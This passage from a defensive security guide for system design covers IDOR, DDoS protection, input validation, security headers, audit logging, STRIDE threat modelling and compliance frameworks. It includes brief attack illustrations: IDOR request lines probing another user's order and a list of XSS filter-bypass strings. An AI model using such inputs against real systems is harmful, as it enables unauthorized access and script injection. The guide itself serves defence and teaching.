- Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16)
- Disable redirects or validate redirect destinations
- Use IMDSv2 on AWS (requires session token)

### IDOR (Insecure Direct Object Reference)

**Attack**:
```
GET /api/orders/1234    → User's own order (OK)
GET /api/orders/1235    → Another user's order (IDOR if no auth check!)
```

**Mitigation**:
```python
# WRONG
def get_order(order_id):
    return Order.query.get(order_id)  # No ownership check!

# CORRECT
def get_order(order_id, current_user):
    order = Order.query.get(order_id)
    if order.user_id != current_user.id:
        raise Forbidden()
    return order
```

### Vulnerability Reference

| Vulnerability | OWASP Rank | Root Cause | Primary Mitigation |
|---|---|---|---|
| SQL Injection | A03 | String concatenation in queries | Parameterized queries, ORM |
| XSS | A03 | Unescaped output | Output encoding, CSP |
| CSRF | Mitigated more now | Missing origin validation | SameSite cookies, CSRF tokens |
| SSRF | A10 | Unvalidated URL fetch | Allowlist, block internal IPs |
| IDOR | A01 | Missing authorization check | Always check ownership |
| Broken Auth | A07 | Weak passwords, no MFA | Strong auth, MFA, rate limiting |

---

## 16. DDoS Protection

### Types of DDoS Attacks

| Layer | Type | Example |
|---|---|---|
| L3/L4 | Volumetric | UDP flood, ICMP flood, DNS amplification |
| L4 | Protocol | SYN flood, Smurf attack |
| L7 | Application | HTTP flood, Slowloris, API abuse |

### Rate Limiting

```python
# Token bucket algorithm
class TokenBucket:
    def __init__(self, capacity, refill_rate):
        self.capacity = capacity
        self.tokens = capacity
        self.refill_rate = refill_rate  # tokens/second
        self.last_refill = time.time()
    
    def consume(self, tokens=1):
        self.refill()
        if self.tokens >= tokens:
            self.tokens -= tokens
            return True  # Allow
        return False  # Rate limited

    def refill(self):
        now = time.time()
        self.tokens = min(
            self.capacity,
            self.tokens + (now - self.last_refill) * self.refill_rate
        )
        self.last_refill = now
```

**Rate limiting levels**:
- Per IP (basic, bypassed with botnet)
- Per user ID (requires authentication)
- Per API key
- Per endpoint
- Global (protect backend capacity)

### Web Application Firewall (WAF)

```
Client → [WAF] → Load Balancer → Application

WAF Rules:
  - Block OWASP Top 10 attack patterns
  - Geo-blocking (block traffic from specific countries)
  - IP reputation lists
  - Request size limits
  - Custom rules (block specific User-Agents, paths)
```

Products: AWS WAF, Cloudflare WAF, Fastly Next-Gen WAF, ModSecurity (open source)

### BGP Blackholing

For massive volumetric attacks (hundreds of Gbps):
```
Upstream provider drops traffic destined for victim IP at the network level
Traffic never reaches victim's network
Tradeoff: victim's IP becomes unreachable (self-inflicted availability loss)
Better than total infrastructure outage
```

### Cloudflare Magic Transit

- Anycast routing — traffic routed to nearest Cloudflare PoP
- Filters attack traffic at the edge (globally distributed scrubbing centers)
- Clean traffic tunneled back to origin via GRE/Argo tunnel
- Can handle multi-Tbps attacks

### DDoS Defense Layers

```
Layer 1: Anycast CDN / DDoS scrubbing (Cloudflare, Akamai) — volumetric attacks
Layer 2: Rate limiting at load balancer — L7 throttling
Layer 3: WAF rules — application-layer attacks
Layer 4: Application-level rate limiting (Redis + Lua) — per-user abuse
Layer 5: CAPTCHA for suspicious traffic patterns
```

---

## 17. Input Validation and Injection Prevention

### Defense-in-Depth Validation

```python
from pydantic import BaseModel, validator, EmailStr
import re

class UserRegistration(BaseModel):
    username: str
    email: EmailStr
    age: int
    
    @validator('username')
    def username_valid(cls, v):
        if not re.match(r'^[a-zA-Z0-9_]{3,30}$', v):
            raise ValueError('Username must be 3-30 alphanumeric characters')
        return v
    
    @validator('age')
    def age_valid(cls, v):
        if not 13 <= v <= 150:
            raise ValueError('Invalid age')
        return v
```

### Allowlist vs Denylist

- **Allowlist (whitelist)**: Define what IS allowed — preferred
- **Denylist (blacklist)**: Define what is NOT allowed — incomplete, bypassed

```python
# Denylist — incomplete, can be bypassed
if "<script>" in user_input:
    reject()
# Bypass: <ScRiPt>, <SCRIPT>, javascript:, onclick=

# Allowlist — complete
ALLOWED_TAGS = {'b', 'i', 'em', 'strong', 'a'}
sanitized = bleach.clean(user_input, tags=ALLOWED_TAGS, strip=True)
```

### Content Security Policy

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.trusted.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self'
```

### Other Security Headers

```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=(), microphone=()
```

---

## 18. Audit Logging

### What to Log

```json
{
  "event_id": "evt_01H2X...",
  "timestamp": "2024-01-15T10:30:00.000Z",
  "event_type": "user.login.success",
  "actor": {
    "user_id": "user:42",
    "email": "alice@example.com",  // Consider PII masking
    "ip_address": "1.2.3.4",
    "user_agent": "Mozilla/5.0..."
  },
  "resource": {
    "type": "session",
    "id": "sess_abc123"
  },
  "context": {
    "request_id": "req_xyz789",
    "service": "auth-service",
    "environment": "production",
    "region": "us-east-1"
  },
  "outcome": "success"
}
```

**Must-log events**:
- Authentication: login success/failure, logout, MFA events
- Authorization: access granted/denied decisions
- Data access: reads of sensitive records (PII, financial)
- Data mutations: creates, updates, deletes
- Admin actions: role changes, user provisioning
- Security events: password changes, MFA enrollment, account lockout
- System events: deployments, config changes

### PII Considerations

```python
import hashlib

def audit_log(user, action, resource):
    # Pseudonymize PII
    user_hash = hashlib.sha256(user.email.encode() + SALT).hexdigest()[:16]
    
    log_event({
        "user_identifier": user_hash,  # Not the actual email
        "action": action,
        "resource": resource,
        # IP may be PII under GDPR — truncate last octet
        "ip_truncated": ".".join(user.ip.split(".")[:3]) + ".0"
    })
```

### SIEM Integration

```
Log Sources                  Collection              SIEM
  App Servers ──────────────► Fluentd/Filebeat ──►  Splunk / Elastic SIEM
  Databases ────────────────►                         │
  Network Devices ──────────►                         ├── Correlation Rules
  Cloud Audit Logs ─────────►                         ├── Threat Detection
  Identity Provider ────────►                         └── Alerts → PagerDuty
```

**Log retention**:
- Security logs: 1-3 years (compliance requirement)
- PCI-DSS: 1 year minimum
- HIPAA: 6 years
- GDPR: Minimum necessary (tension with security retention needs)

---

## 19. Threat Modeling: STRIDE

### STRIDE Framework

| Threat | Definition | Example | Mitigation |
|---|---|---|---|
| **S**poofing | Impersonating someone/something | Claiming to be admin user | Authentication, certificates |
| **T**ampering | Modifying data in unauthorized way | Altering API request params | Integrity checks, HMAC, TLS |
| **R**epudiation | Denying an action took place | "I never deleted that record" | Audit logging, digital signatures |
| **I**nformation Disclosure | Exposing data to unauthorized parties | Error messages revealing stack traces | Error handling, encryption |
| **D**enial of Service | Making system unavailable | DDoS attack | Rate limiting, WAF, redundancy |
| **E**levation of Privilege | Gaining unauthorized access level | Normal user accessing admin API | Authorization checks, least privilege |

### Threat Modeling Process

```
1. Decompose the system
   - Draw data flow diagrams (DFD)
   - Identify: processes, data stores, external entities, data flows, trust boundaries

2. Identify threats (STRIDE per element)
   - For each data flow: can data be tampered? intercepted?
   - For each process: can it be spoofed? DoS'd?
   - For each data store: can it be accessed without authorization?

3. Rate threats (DREAD or CVSS)
   - DREAD: Damage, Reproducibility, Exploitability, Affected users, Discoverability
   - Risk = Probability × Impact

4. Mitigate and track
   - Assign mitigations
   - Track in backlog
   - Re-evaluate after mitigation
```

### Attack Surface Analysis

```
External Attack Surface:
  - Public APIs
  - Login pages
  - File upload endpoints
  - Webhooks receiving external data

Internal Attack Surface:
  - Microservice-to-microservice APIs
  - Admin panels
  - Database access
  - Internal tooling

Reduce attack surface:
  - Disable unused features
  - Remove unused dependencies
  - Close unused network ports
  - Least privilege for all accounts
```

---

## 20. Compliance Frameworks

### SOC 2

Service Organization Control 2 — for SaaS/service providers.

| Trust Service Criteria | Key Controls |
|---|---|
| Security | Access control, monitoring, incident response |
| Availability | Uptime commitments, disaster recovery |
| Processing Integrity | Correct, complete processing |
| Confidentiality | Data classification, encryption |
| Privacy | GDPR-like privacy principles |

**Type I**: Point-in-time assessment — controls are designed correctly
**Type II**: 6-12 month period — controls are operating effectively

**Design implications**:
- Audit logs required for all data access
- Access review processes
- Change management procedures
- Vulnerability scanning

### GDPR (General Data Protection Regulation)

| Requirement | System Design Impact |
|---|---|
| Right to erasure ("be forgotten") | Soft deletes, cascade delete capability |
| Data portability | Export API in machine-readable format |
| Data minimization | Don't collect unnecessary data |
| Consent tracking | Store consent records with timestamp |
| Breach notification (72 hours) | Security incident detection and alerting |
| Privacy by design | Encrypt at rest, minimize data flow |
| Data residency | Host EU user data in EU regions |
| DPO appointment | Process requirement |

**PII handling in logs**:
```python
# Log pseudonymization
LOG_FIELDS_TO_HASH = ['email', 'phone', 'ip_address']
LOG_FIELDS_TO_OMIT = ['password', 'credit_card', 'ssn']
```

### PCI-DSS (Payment Card Industry Data Security Standard)

For systems handling cardholder data.

| Requirement | Implementation |
|---|---|
| No storing CVV | Never persist CVV/CVC after authorization |
| Encrypt PAN at rest | AES-256 for stored card numbers |
| TLS in transit | TLS 1.2+ for all cardholder data |
| Network segmentation | Isolate cardholder data environment |
| Access logging | Log all access to cardholder data |
| Annual penetration testing | Required for Level 1 merchants |
| Quarterly ASV scans | Approved Scanning Vendor vulnerability scans |

**Practical advice**: Use Stripe/Braintree tokenization — never let cardholder data touch your servers.

---

## 21. Quick Reference

### OAuth 2.0 Flow Decision Matrix

```
Is a human user involved?
  ├── Yes:
  │     Is the client a web server (can keep secret)?
  │       ├── Yes → Authorization Code Flow
  │       └── No (SPA/Mobile) → Authorization Code + PKCE
  │
  │     Is the client a TV/CLI with no browser?
  │       └── Yes → Device Code Flow
  │
  └── No (machine-to-machine):
        └── Client Credentials Flow
```

### Security Checklist for System Design

**Authentication**
- [ ] Use industry-standard auth (OAuth 2.0 + OIDC, not roll-your-own)
- [ ] Enforce MFA for sensitive operations and admin accounts
- [ ] Store passwords with Argon2id or bcrypt (cost factor 12+)
- [ ] Implement account lockout / progressive delay after failed attempts
- [ ] JWT: short expiry (15min-1hr), RS256/ES256 signing

**Authorization**
- [ ] Principle of least privilege for all accounts and services
- [ ] Check authorization on every API endpoint (not just in UI)
- [ ] Prevent IDOR — always validate resource ownership

**Data Protection**
- [ ] Encrypt sensitive data at rest (AES-256-GCM)
- [ ] TLS 1.2+ for all traffic (prefer TLS 1.3)
- [ ] mTLS for service-to-service communication
- [ ] Use envelope encryption with KMS for data encryption keys

**Secrets**
- [ ] No secrets in source code or environment variables
- [ ] Use Vault or cloud secret manager
- [ ] Rotate secrets regularly and on suspected compromise
- [ ] Audit all secret access

**Input/Output**
- [ ] Validate all inputs (type, length, format, allowlist where possible)
- [ ] Parameterized queries for all database operations
- [ ] Encode all output to prevent XSS
- [ ] Set security headers (CSP, HSTS, X-Frame-Options)
- [ ] Implement CSRF protection

**Infrastructure**
- [ ] WAF in front of public endpoints
- [ ] Rate limiting at multiple layers
- [ ] DDoS protection (CDN/scrubbing service)
- [ ] Regular penetration testing
- [ ] Vulnerability scanning in CI/CD pipeline

**Observability**
- [ ] Comprehensive audit logging
- [ ] Log authentication and authorization events
- [ ] Centralized log aggregation (SIEM)
- [ ] Alerting on suspicious patterns (impossible travel, brute force)

### Common Algorithms Reference

| Use Case | Algorithm | Notes |
|---|---|---|
| Password hashing | Argon2id | Preferred; bcrypt acceptable |
| Symmetric encryption | AES-256-GCM | Provides confidentiality + integrity |
| Asymmetric encryption | RSA-2048+, ECDSA | RSA for legacy, ECDSA for new |
| TLS | TLS 1.3 | Disable 1.0, 1.1; 1.2 acceptable |
| HMAC | HMAC-SHA256 | Request signing, token verification |
| Key exchange | ECDHE | Forward secrecy |
| Hashing (non-password) | SHA-256, SHA-3 | Never MD5/SHA-1 for new systems |
| Token signing | RS256 / ES256 | Prefer over HS256 in multi-service |

### HTTP Security Headers Quick Reference

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=()
Cache-Control: no-store  (for sensitive pages)
```
